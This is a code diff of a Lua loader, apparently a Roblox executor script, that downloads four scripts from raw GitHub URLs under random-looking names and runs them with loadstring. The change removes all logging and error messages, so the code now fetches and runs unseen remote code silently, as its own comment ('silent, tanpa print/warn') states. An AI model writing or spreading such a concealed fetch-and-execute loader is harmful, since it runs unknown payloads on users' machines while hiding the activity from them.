@@ -1,5 +1,4 @@
--- Gabungan loader untuk 3 script (dengan error handling)
--- Bahasa: Indonesia
+-- Gabungan loader untuk 4 script (silent, tanpa print/warn)
 local urls = {
     "https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/vgegrege%20TempleLever",
     "https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/fgrrrrhh5h5j%20000001%20Hunt",
@@ -7,30 +6,17 @@ local urls = {
     "https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/ferwegetegt%20Notify%20Old%20New"
 }
 
-for i, url in ipairs(urls) do
+for _, url in ipairs(urls) do
     local fetchOK, sourceOrErr = pcall(function()
         return game:HttpGet(url)
     end)
 
-    if not fetchOK then
-        warn(("[%d] Gagal fetch URL: %s\nError: %s"):format(i, url, tostring(sourceOrErr)))
-    else
-        if not sourceOrErr or #sourceOrErr == 0 then
-            warn(("[%d] Isi script kosong dari URL: %s"):format(i, url))
-        else
-            local execOK, execErr = pcall(function()
-                local fn, compileErr = loadstring(sourceOrErr)
-                if not fn then
-                    error(("Compile error: %s"):format(tostring(compileErr)))
-                end
+    if fetchOK and sourceOrErr and #sourceOrErr > 0 then
+        pcall(function()
+            local fn, compileErr = loadstring(sourceOrErr)
+            if fn then
                 fn()
-            end)
-
-            if execOK then
-                print(("[%d] Script dari URL berhasil dijalankan: %s"):format(i, url))
-            else
-                warn(("[%d] Gagal mengeksekusi script dari URL: %s\nError: %s"):format(i, url, tostring(execErr)))
             end
-        end
+        end)
     end
 end
